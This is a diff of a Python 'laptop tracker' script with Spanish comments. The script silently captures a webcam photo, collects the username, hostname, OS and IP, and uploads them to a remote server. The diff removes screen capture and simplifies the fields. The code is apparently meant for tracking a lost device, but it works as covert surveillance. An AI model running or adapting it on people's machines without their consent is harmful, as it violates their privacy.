@@ -4,12 +4,12 @@ import socket
 import getpass
 from datetime import datetime
 import cv2
-import pyautogui
+import os
 
 # ========================
 # CONFIGURACIÓN
 # ========================
-SERVER_URL = "https://laptop-tracker-server.onrender.com/report"
+SERVER_URL = "https://laptop-tracker-server.onrender.com/report"  # <-- tu URL real
 
 # ========================
 # FUNCIONES
@@ -23,16 +23,8 @@ def capturar_webcam(path='webcam.jpg'):
             cv2.imwrite(path, frame)
         else:
             with open(path, 'wb') as f:
-                f.write(b'')
+                f.write(b'')  # vacía si no se pudo
         cam.release()
-    except:
-        with open(path, 'wb') as f:
-            f.write(b'')
-
-def capturar_pantalla(path='pantalla.jpg'):
-    try:
-        screenshot = pyautogui.screenshot()
-        screenshot.save(path)
     except:
         with open(path, 'wb') as f:
             f.write(b'')
@@ -41,29 +33,19 @@ def recolectar_info():
     hostname = socket.gethostname()
     usuario = getpass.getuser()
     sistema = f"{platform.system()} {platform.release()}"
-    try:
-        ip = socket.gethostbyname(hostname)
-    except:
-        ip = "Desconocido"
-    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
+    ip = socket.gethostbyname(hostname)
     return {
-        'hostname': hostname,
-        'usuario': usuario,
-        'sistema': sistema,
         'ip': ip,
-        'hora': hora
+        'usuario': usuario,
+        'sistema': sistema
     }
 
 def enviar_reporte():
     capturar_webcam("webcam.jpg")
-    capturar_pantalla("pantalla.jpg")
-
     datos = recolectar_info()
 
     files = {
-        "imagen_webcam": open("webcam.jpg", "rb")
-        # Si quieres también enviar la pantalla, hay que ajustar el servidor
+        "imagen": open("webcam.jpg", "rb")  # <-- NOMBRE CAMBIADO para que coincida con el servidor
     }
 
     try:
@@ -72,5 +54,8 @@ def enviar_reporte():
     except Exception as e:
         print("Error al enviar reporte:", e)
 
+# ========================
+# EJECUCIÓN
+# ========================
 if __name__ == "__main__":
     enviar_reporte()
